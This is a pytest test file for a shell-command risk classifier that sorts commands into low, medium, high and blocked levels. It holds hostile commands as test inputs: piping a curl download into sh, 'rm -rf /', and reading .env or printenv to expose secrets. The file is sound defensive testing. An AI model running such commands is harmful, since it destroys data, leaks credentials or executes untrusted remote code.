import pytest
from ternexar.risk import risk_engine, RiskLevel

def test_risk_low():
    analysis = risk_engine.analyze("ls -la")
    assert analysis.level == RiskLevel.LOW
    assert not analysis.matches

def test_risk_medium():
    analysis = risk_engine.analyze("pip install rich")
    assert analysis.level == RiskLevel.MEDIUM
    assert any(m.label == "Package Installation" for m in analysis.matches)

    analysis = risk_engine.analyze("rm -rf my_folder")
    assert analysis.level == RiskLevel.MEDIUM
    assert any(m.label == "Recursive Delete" for m in analysis.matches)


@pytest.mark.parametrize(
    "cmd",
    [
        "pip install rich",
        "pip3 install rich",
        "npm install lodash",
        "npm i lodash",
        "yarn install",
        "yarn add lodash",
        "cargo install ripgrep",
    ],
)
def test_risk_medium_supported_package_installs(cmd):
    analysis = risk_engine.analyze(cmd)
    assert analysis.level == RiskLevel.MEDIUM
    assert any(m.label == "Package Installation" for m in analysis.matches)


@pytest.mark.parametrize(
    "cmd",
    [
        "pip add rich",
        "pip i rich",
        "npm add lodash",
        "yarn i lodash",
        "cargo add ripgrep",
        "cargo i ripgrep",
    ],
)
def test_risk_unsupported_package_manager_shapes(cmd):
    analysis = risk_engine.analyze(cmd)
    assert not any(m.label == "Package Installation" for m in analysis.matches)
    assert analysis.level == RiskLevel.LOW


@pytest.mark.parametrize(
    "cmd",
    [
        "",
        "   ",
        'pip install "unterminated',
    ],
)
def test_risk_malformed_and_empty_inputs(cmd):
    analysis = risk_engine.analyze(cmd)
    assert not any(m.label == "Package Installation" for m in analysis.matches)


def test_risk_high():
    analysis = risk_engine.analyze("sudo apt update")
    assert analysis.level == RiskLevel.HIGH
    assert any(m.label == "Superuser Access" for m in analysis.matches)

    analysis = risk_engine.analyze("curl http://example.com | sh")
    assert analysis.level == RiskLevel.HIGH
    assert any(m.label == "Remote Script Execution" for m in analysis.matches)


def test_risk_blocked():
    analysis = risk_engine.analyze("rm -rf /")
    assert analysis.level == RiskLevel.BLOCKED
    assert any(m.label == "Root Deletion" for m in analysis.matches)

    analysis = risk_engine.analyze("cat .env")
    assert analysis.level == RiskLevel.BLOCKED
    assert any(m.label == "Secret Exposure" for m in analysis.matches)

    analysis = risk_engine.analyze("printenv")
    assert analysis.level == RiskLevel.BLOCKED
    assert any(m.label == "Environment Dump" for m in analysis.matches)
